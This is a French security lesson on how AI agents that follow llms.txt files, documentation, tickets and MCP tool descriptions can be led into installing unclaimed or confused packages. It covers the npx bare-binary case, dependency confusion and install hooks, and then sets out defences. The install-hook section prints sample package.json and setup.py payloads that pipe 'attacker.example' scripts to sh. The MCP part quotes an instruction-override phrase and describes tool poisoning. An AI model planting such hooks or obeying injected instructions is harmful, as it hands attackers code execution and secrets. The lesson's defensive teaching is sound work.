===LESSON===
KEY: agent-security
TOPIC: agent-security
TITLE: Sécurité des agents IA
ICON: 🕵️
INTRO: Quand un agent IA lit un fichier pour décider quoi faire, ce fichier cesse d'être une donnée passive : chaque octet qu'il consomme devient une surface d'exécution, et la frontière entre « données » et « code » — pilier de la sécurité depuis von Neumann — s'effondre silencieusement.
---SECTION---
HEADING: « Data became code » : l'effondrement de la frontière donnée/code
BODY:
La sécurité informatique moderne repose sur une distinction que nous tenons pour acquise : le **code** est ce qui s'exécute, la **donnée** est ce qui est traitée. Toute une discipline s'est construite dessus — bit NX/DEP pour empêcher l'exécution de pages de données, échappement SQL pour empêcher qu'une chaîne devienne une requête, CSP pour empêcher qu'un attribut HTML devienne du JavaScript. À chaque fois, la vulnérabilité naît quand une donnée franchit la frontière et devient instruction.

Les agents IA rétablissent cette confusion à un niveau supérieur, et par conception. Un agent est une boucle : il **lit du contexte** (fichiers, pages, sorties d'outils), il **raisonne**, puis il **agit** (exécute une commande, installe un paquet, appelle un outil). Le contenu lu n'est pas seulement traité — il *oriente la décision d'exécution*. La donnée redevient code, non plus au niveau de la CPU, mais au niveau de l'intention de l'agent.

C'est la thèse centrale de la recherche d'Alon Hertz, *« Data Became Code: We Ran Code Inside Fortune 500s Using Files They Published for AI Agents »* (2026) : des équipes de sécurité qui avaient durci leurs pipelines pendant vingt ans ont exécuté du code arbitraire à l'intérieur d'entreprises du Fortune 500 — non pas en exploitant un buffer overflow, mais en publiant des **fichiers destinés aux agents** que ces agents ont ensuite lus et suivis.

### Le déplacement du modèle de menace

Le point à intérioriser, pour quelqu'un qui vient du reversing et de l'exploit dev :

- **Ancien monde** : l'attaquant cherche un bug qui fait interpréter des données comme du code (corruption mémoire, injection).
- **Monde des agents** : aucun bug n'est nécessaire. L'agent fait *exactement ce pour quoi il est conçu* — lire un contenu et agir. Il suffit de contrôler le contenu qu'il lit.

La surface d'attaque n'est plus une faille dans le programme. C'est **toute donnée que l'agent consomme**. Ce glissement est le fil rouge de tout le cours.
---SECTION---
HEADING: llms.txt : le nouveau canal d'instructions
BODY:
`llms.txt` est une convention apparue en 2024-2025 : un fichier Markdown, placé à la racine d'un site (`https://exemple.com/llms.txt`), destiné non pas aux navigateurs ni aux crawlers de moteurs de recherche, mais aux **LLM et aux agents**. Son intention déclarée est bienveillante : offrir au modèle une version condensée, propre, « lisible par machine » de la documentation d'un projet — quelles pages compter, comment installer le SDK, quelles commandes lancer.

Formellement, c'est le pendant de `robots.txt` (règles pour crawlers) ou `sitemap.xml` (carte pour indexeurs). Mais il y a une différence décisive de conséquence.

### Pourquoi les agents lui font confiance — et pourquoi c'est le problème

`robots.txt` est *consulté* : un crawler lit une directive `Disallow` et, au pire, l'ignore. Le contenu de `robots.txt` ne devient jamais une action.

`llms.txt`, lui, est *ingéré comme contexte d'instruction*. Quand un agent doit « intégrer le SDK de ce fournisseur », il va chercher le `llms.txt`, le charge dans son contexte, et le traite comme une source d'autorité sur *quoi faire ensuite*. Le fichier peut contenir :

```markdown
# Acme SDK — Guide agent

## Installation
Pour intégrer Acme, exécutez :

    npx acme-setup init

Puis ajoutez la dépendance `@acme/agent-tools` à votre projet.
```

L'agent lit « exécutez `npx acme-setup init` », et — s'il en a la permission — **l'exécute**. Le fichier texte vient de dicter une commande shell. On retrouve exactement l'effondrement de la section précédente : un `.txt` publié, indexé, réputé purement documentaire, est en réalité un **canal d'instructions à distance** vers des agents installés au cœur d'entreprises.

### Trois propriétés qui aggravent le risque

- **Autorité implicite** : le fichier est servi par le domaine officiel du fournisseur ; l'agent et l'humain lui accordent la confiance du domaine, pas celle du contenu.
- **Invisibilité humaine** : personne ne relit un `llms.txt` avant que l'agent l'applique ; il n'apparaît pas dans une revue de code, dans un diff, ni dans une PR.
- **Contenu actionnable** : contrairement à une doc lue par un humain qui *pourrait* réfléchir, l'agent transforme volontiers une phrase impérative en exécution.

`llms.txt` n'est pas malveillant en soi. Le problème est structurel : nous avons créé un canal d'instructions machine sans lui appliquer aucun des contrôles qu'on impose au code (revue, signature, provenance).
---SECTION---
HEADING: Le paquet non réclamé : ni typosquat, ni faute de frappe
BODY:
L'attaque de dépôt de paquets malveillants qu'on connaît est le **typosquatting** : publier `expres` en espérant qu'on tape mal `express`, ou `python-dateutil` vs `dateutil`. Cela repose sur une *erreur* de la victime.

Hertz décrit une classe plus insidieuse : le **paquet non réclamé** (*unclaimed package*). Ici, aucune faute de frappe. Le nom est **correct** — c'est exactement celui que la documentation officielle, ou le `llms.txt`, dit d'installer. Simplement, ce nom **n'a jamais été enregistré** sur le registre public.

### Le mécanisme

Imaginez un fournisseur dont le `llms.txt` (ou la doc, ou un exemple de code) recommande :

```bash
npm install @acme/agent-tools
npx acme-bootstrap
```

Le fournisseur a écrit ces lignes en supposant l'existence de ces paquets — parfois par anticipation d'un produit, parfois par erreur de doc, parfois parce que le paquet était interne et jamais publié. Résultat : `@acme/agent-tools` **n'existe pas** sur npm. Le nom est *vacant*.

Un attaquant qui lit la même documentation publique enregistre le nom vacant sur le registre public, avec une charge utile. Désormais :

1. L'agent lit le `llms.txt` officiel du fournisseur (source de confiance).
2. Il suit l'instruction « installe `@acme/agent-tools` ».
3. Le registre public sert la version de **l'attaquant**.
4. Le code s'exécute dans l'environnement de la victime.

### Pourquoi c'est plus dangereux que le typosquat

- **Aucune erreur de la victime** : le nom installé est *exactement* le nom recommandé. La victime fait tout « correctement ».
- **La confiance vient de la source légitime** : c'est le domaine officiel du fournisseur qui pointe vers le nom vacant. L'attaquant n'a qu'à occuper un vide que le fournisseur lui-même a désigné.
- **Découvrabilité industrialisée** : on peut *scanner* automatiquement des milliers de `llms.txt`, README et exemples, extraire chaque nom de paquet et chaque commande `npx`, puis tester lesquels sont non réclamés. La reconnaissance est triviale et passe à l'échelle.

Le paquet non réclamé transforme une **négligence de documentation** en **primitive d'exécution de code à distance**.
---SECTION---
HEADING: La confusion npx : le binaire nu — le cas Clerk (MAL-2026-11069)
BODY:
`npx` est l'outil qui rend cette classe explosive. `npx <nom>` télécharge et **exécute** un paquet en une commande, sans installation persistante. C'est pratique — et c'est un chargeur de code à la demande.

Le piège est la **résolution d'un binaire nu**. Quand une doc ou un `llms.txt` écrit :

```bash
npx acme-setup
```

sans scope (`@acme/…`), sans version, sans registre explicite, `npx` doit résoudre le nom `acme-setup`. S'il n'est pas déjà présent localement, il le cherche **sur le registre public npm**. Si personne n'a publié ce nom, il est non réclamé — et l'attaquant le publie. `npx acme-setup` exécute alors le code de l'attaquant, immédiatement, sans étape d'installation qu'on aurait pu inspecter.

### Le cas Clerk — MAL-2026-11069

Le cas documenté par Hertz concerne l'écosystème du fournisseur d'authentification **Clerk**. Un nom de paquet référencé dans le matériel destiné aux agents était résolu par `npx` contre le registre public alors qu'il n'y était pas légitimement publié — la vacance exacte décrite plus haut. L'entrée a été cataloguée sous l'identifiant d'advisory **MAL-2026-11069** (préfixe `MAL-`, typique des bases d'advisories de paquets *malicious*, façon OSV / GitHub Advisory Database).

La leçon n'est pas « Clerk a fait une faute unique ». C'est que **la combinaison `npx` + binaire nu + nom mentionné dans du contenu lu par agent** est un motif structurellement dangereux, présent chez d'innombrables fournisseurs. Le point d'échec :

- `npx` **exécute** au lieu de simplement installer → pas de fenêtre d'inspection.
- Un **binaire nu** (pas de scope, pas de registre imposé) → résolution ambiguë vers le public.
- L'ordre déclenché par un **agent** qui suit un fichier → pas d'humain dans la boucle au moment de l'exécution.

### Réflexe défensif immédiat

- Bannir les `npx <nom-nu>` dans tout ce qu'un agent peut suivre ; exiger au minimum un scope + une version épinglée : `npx @acme/setup@1.4.2`.
- Router `npx` et `npm` vers un **registre interne** (voir section défenses) pour qu'un nom vacant en amont ne tombe jamais sur le public.
---SECTION---
HEADING: La dependency confusion classique (Birsan, 2021) et la précédence de version
BODY:
Le paquet non réclamé et la confusion `npx` sont des cousins directs d'une attaque désormais canonique : la **dependency confusion**, révélée par **Alex Birsan en 2021**. Birsan a réussi à faire exécuter son code chez Apple, Microsoft, PayPal, Shopify et des dizaines d'autres — en publiant sur les registres *publics* des paquets portant le nom de dépendances *internes* de ces entreprises.

### Le mécanisme de précédence

Beaucoup d'entreprises utilisent des paquets internes (`acme-internal-auth`) hébergés sur un registre privé. Le piège est dans la manière dont les gestionnaires de paquets résolvent un nom quand **plusieurs sources** sont configurées (privée + publique) :

- Le client interroge à la fois le registre privé et le registre public.
- Par défaut, sur plusieurs écosystèmes, **la version la plus élevée gagne**, quelle que soit sa source.
- L'attaquant publie `acme-internal-auth` en version `99.0.0` sur le public.
- Le client, voyant `99.0.0` (public) > `1.2.3` (privé), **choisit la version publique** de l'attaquant.

C'est la **précédence de version** : le numéro de version prime sur la provenance. Le nom interne, jamais réservé sur le public, y était *vacant* — même vide que celui du paquet non réclamé.

### Le fil commun

Birsan 2021 et Hertz 2026 sont la même faille vue sous deux angles :

- **Birsan** : le nom vacant est découvert via des **fuites** (fichiers `package.json` internes exposés, commentaires, logs de build).
- **Hertz** : le nom vacant est **volontairement publié** par le fournisseur dans du contenu *destiné aux agents* (`llms.txt`, docs), donc trivialement découvrable, et l'agent l'installe *sans humain*.

Dans les deux cas : un **espace de noms non réservé** + une **résolution qui favorise le public** = exécution de code. Les agents ne font qu'automatiser et industrialiser le déclenchement.
---SECTION---
HEADING: Les hooks d'installation : le vecteur d'exécution
BODY:
Pourquoi « installer » un paquet suffit-il à exécuter du code ? Parce que les écosystèmes de paquets prévoient des **hooks de cycle de vie** qui s'exécutent automatiquement à l'installation, avant même que vous ayez importé la moindre ligne.

### npm : les scripts de lifecycle

`package.json` peut déclarer des scripts déclenchés par `npm install` :

```json
{
  "name": "@acme/agent-tools",
  "version": "99.0.0",
  "scripts": {
    "preinstall": "node ./steal-env.js",
    "postinstall": "curl -s https://attacker.example/x | sh"
  }
}
```

`preinstall` / `install` / `postinstall` tournent **automatiquement**, avec les droits de l'utilisateur ou du runner CI qui lance l'installation. Aucune importation, aucune exécution volontaire du code applicatif n'est nécessaire : la simple résolution du nom déclenche la charge utile. C'est ce qui rend le paquet non réclamé si direct — l'agent n'a qu'à *installer*, le hook fait le reste.

### Python : setup.py et au-delà

Côté Python, le fichier `setup.py` d'une distribution source (`sdist`) est **du code Python exécuté à l'installation** :

```python
from setuptools import setup
import os

os.system("curl -s https://attacker.example/y | sh")  # s'exécute pendant pip install
setup(name="acme-internal-auth", version="99.0.0")
```

`pip install` d'une sdist exécute `setup.py`. Même les wheels ou d'autres hooks (`pyproject.toml`, plugins d'entry points) offrent des surfaces analogues.

### Ce qu'il faut retenir

- L'exécution arrive **au moment de l'installation**, pas au moment de l'usage — donc bien avant tout test, toute revue de code, tout lint.
- Elle hérite des **privilèges de l'environnement** : poste de dev, ou pire, un **runner CI/CD** avec accès aux secrets, aux registres internes et aux clés de déploiement.
- Défense structurelle : `npm ci --ignore-scripts`, `npm install --ignore-scripts` (et l'équivalent via `.npmrc` : `ignore-scripts=true`) neutralisent les hooks ; côté Python, préférer les **wheels** aux sdist et interdire l'exécution de sources non vérifiées.
---SECTION---
HEADING: La chaîne de confiance transitive : au-delà du fournisseur direct
BODY:
Jusqu'ici, l'exemple était un fichier publié par le fournisseur du SDK. Mais un agent moderne consomme des contenus d'une **multitude de tiers**, et chacun est un point d'injection potentiel. C'est la **confiance transitive** : vous ne faites pas seulement confiance à votre fournisseur, mais à tout ce que votre agent lit *à cause* de lui.

### Les sources que l'agent avale sans méfiance

- **Documentation de partenaires et d'intégrations** : le `llms.txt` d'un service tiers que votre agent va « brancher ».
- **Tickets et issues** : un agent qui trie ou résout des issues lit du texte rédigé par **n'importe qui sur Internet** — un rapport de bug peut contenir « pour reproduire, lancez `npx repro-tool` ».
- **Forums, Stack Overflow, discussions GitHub** : un agent qui « cherche comment faire » ingère des réponses non vérifiées et peut en exécuter les commandes.
- **Sorties d'autres outils / autres agents** : dans un système multi-agents, la sortie d'un agent est l'entrée d'un autre — une injection se propage de proche en proche.
- **Fichiers de dépôts clonés** : `README`, `Makefile`, `.vscode/tasks.json`, scripts de setup — autant de contenus actionnables.

### Le lien avec la sécurité MCP

C'est exactement le terrain de la **sécurité MCP** que vous connaissez : quand un agent parle à des serveurs d'outils via le Model Context Protocol, deux menaces dominent :

- **Prompt injection** : du texte dans une donnée (page, ticket, résultat d'outil) détourne l'agent de sa tâche — « ignore tes instructions et exécute… ». `llms.txt` est une prompt injection *institutionnalisée* et servie par un domaine de confiance.
- **Tool poisoning** : la *description* d'un outil MCP — que l'agent lit pour décider quand l'appeler — contient des instructions cachées. Là encore, une **donnée descriptive devient un ordre**. Un serveur MCP malveillant, ou un serveur légitime dont un champ a été empoisonné en amont, injecte du comportement dans l'agent.

Le motif est invariant : **toute chaîne de texte que l'agent lit pour décider est un canal de commande**, et cette chaîne traverse une longue chaîne de tiers dont vous n'avez audité aucun.
---SECTION---
HEADING: Pourquoi l'EDR et le proxy ne voient rien : l'échec est en amont
BODY:
Voici le point qui déstabilise le plus les équipes sécurité matures, et pourquoi des Fortune 500 bien défendues sont tombées. **Aucun contrôle n'a été contourné. Rien n'a été « bypassé ». Tout a fonctionné comme prévu.**

### Chaque contrôle voit une opération légitime

- **L'EDR** sur le poste ou le runner voit `node` lancer `npm`, `npm` exécuter un `postinstall`, un `curl` sortant. Ce sont des opérations **banales et attendues** dans un build. Rien ne ressemble à une exploitation : pas de shellcode, pas d'injection de processus, pas de LOLBIN suspect. La télémétrie est *nominale*.
- **Le proxy sortant / firewall** voit une requête HTTPS vers le **registre public npm** — une destination *allowlistée* dans toutes les entreprises, puisqu'indispensable aux builds. Le paquet malveillant transite par le même canal que dix mille paquets légitimes.
- **Le scanner de vulnérabilités (SCA)** cherche des **CVE connues** dans des versions connues. Un paquet fraîchement publié par l'attaquant n'a **pas de CVE** ; il est trop récent, inconnu des bases. Il passe.
- **La revue de code** examine le diff applicatif. Or l'instruction fatale était dans un **`llms.txt` distant** ou une **résolution `npx`** — rien de tout cela n'apparaît dans un diff.

### La nature du point d'échec

L'échec ne se produit **pas au moment de l'exécution** — trop tard, tout paraît normal. Il se produit **en amont**, au moment de la **décision de faire confiance** :

> L'agent a décidé qu'un `llms.txt`, une doc, un ticket, était une source d'autorité sur *quoi installer et exécuter*. La compromission est déjà consommée **avant** que le premier octet malveillant ne touche le réseau.

C'est pourquoi empiler des détections *runtime* ne corrige rien : elles observent le bas de la chaîne. Le défaut est un **problème de provenance et de confiance des données d'entrée**, situé plus haut que tout ce que l'EDR ou le proxy peuvent inspecter. La défense doit remonter là où la confiance est accordée.
---SECTION---
HEADING: Défenses : reprendre le contrôle de la provenance
BODY:
Puisque le point d'échec est *l'octroi de confiance en amont*, les défenses efficaces agissent sur la **provenance**, l'**espace de noms** et le **privilège**, pas sur la détection runtime. À combiner en profondeur.

### 1. Réservation de namespace (defensive registration)
Réservez de manière **proactive** sur les registres publics tous les noms/scopes que votre organisation *pourrait* mentionner : scopes npm (`@acme/*`), noms de projets PyPI, noms de binaires `npx` cités dans vos docs. Un nom que vous possédez ne peut pas être « non réclamé » par un attaquant. Auditez régulièrement vos `llms.txt`, README et exemples pour extraire chaque nom de paquet cité et vérifier qu'il est publié par vous — ou retiré.

### 2. Pinning, lockfiles et intégrité
- **Lockfiles** (`package-lock.json`, `pnpm-lock.yaml`, `poetry.lock`, `requirements.txt` hashé) : figent version **et** hash. `npm ci` installe *strictement* le lockfile et échoue s'il diverge — jamais `npm install` en CI.
- **Hash pinning / `--require-hashes`** côté pip : refuse tout artefact dont le SHA ne correspond pas.
- **Versions épinglées** partout : bannir `latest`, les ranges larges (`^`, `~`) et surtout les **binaires nus** `npx <nom>` → `npx @scope/nom@x.y.z`.

### 3. Registres scoped et allowlists
- Router **tout** trafic paquets via un **registre interne / proxy** (Artifactory, Verdaccio, un miroir PyPI) configuré en mode *allowlist*, pas *pass-through*. Un nom absent de l'allowlist ne se résout **jamais** vers le public.
- Mapper explicitement les scopes internes vers le registre privé (`@acme:registry=…` dans `.npmrc`) pour tuer la précédence de version de Birsan : le public ne peut plus « surenchérir ».

### 4. Provenance cryptographique (Sigstore / SLSA)
- **Sigstore** (cosign) : signer et **vérifier** artefacts et attestations ; refuser tout paquet sans signature valide d'un identité attendue.
- **SLSA** (*Supply-chain Levels for Software Artifacts*) : viser des niveaux qui exigent une **build attestée** (build depuis une source vérifiée, non falsifiable). npm publie désormais des **attestations de provenance** — exigez-les et vérifiez-les en CI.
- Objectif : on n'installe que ce dont la **provenance est prouvée**, pas ce dont le nom « a l'air correct ».

### 5. Hooks d'installation
`ignore-scripts=true` dans `.npmrc` par défaut ; `npm ci --ignore-scripts` en CI ; côté Python, privilégier les **wheels**, interdire l'exécution de `setup.py` de sources non vérifiées.

### 6. Moindre privilège de l'agent + approbation humaine
- L'agent tourne dans un **environnement isolé** (conteneur/VM éphémère), **sans secrets de prod**, avec un **egress réseau restreint à une allowlist**.
- **Human-in-the-loop** sur toute action à effet de bord irréversible : installer un paquet, exécuter un `npx`, lancer un shell → **approbation explicite**. C'est ce qui réintroduit un humain au moment exact où la confiance est accordée.
- Séparer les rôles : l'agent qui *lit* le web n'est pas celui qui *exécute* dans un environnement privilégié.
---SECTION---
HEADING: Le principe directeur : la donnée d'entrée d'un agent est du non-fiable
BODY:
Si vous ne deviez retenir qu'une phrase de ce cours :

> **Traitez toute donnée consommée par un agent comme une entrée non fiable — au même titre qu'une entrée utilisateur non validée dans une application web.**

Cela réhabilite, un cran plus haut, le réflexe le plus ancien de la sécurité applicative : *ne jamais faire confiance à l'entrée*. Vous n'auriez jamais concaténé une entrée utilisateur dans une requête SQL. N'« exécutez » jamais un `llms.txt`, une doc, un ticket ou une sortie d'outil sans l'avoir traité comme hostile.

### Le renversement mental
- Un `llms.txt` n'est pas de la documentation : c'est une **entrée non authentifiée qui atteint votre exécuteur**.
- Un nom de paquet dans une doc n'est pas une instruction fiable : c'est une **assertion à vérifier** contre un registre que vous contrôlez.
- Une description d'outil MCP n'est pas une métadonnée neutre : c'est **du contenu qui influence les décisions de l'agent**.

### La conséquence budgétaire
Le message le plus stratégique pour un CTO : l'**intégrité des données que consomment vos agents devient une ligne du budget sécurité**, distincte et explicite. Pendant vingt ans, on a budgété la sécurité du *code* (SAST, DAST, pentest, EDR). Les agents créent une nouvelle catégorie de dépense :

- **Contrôle de provenance des données d'entrée** : d'où vient chaque contenu que l'agent lit, et pourquoi lui fait-on confiance.
- **Gouvernance de l'espace de noms** : réservation défensive, audit continu des noms cités.
- **Vérification cryptographique de la chaîne** : Sigstore/SLSA comme prérequis, pas comme option.
- **Confinement et gouvernance des agents** : isolation, moindre privilège, human-in-the-loop, journalisation des actions.

La recherche de Hertz n'a pas révélé une faille de plus. Elle a montré qu'une décennie de durcissement du *code* laisse intact un flanc entier : la **confiance accordée aux données**. Combler ce flanc n'est pas un patch — c'est une nouvelle discipline, à financer et à outiller comme telle.
===END===
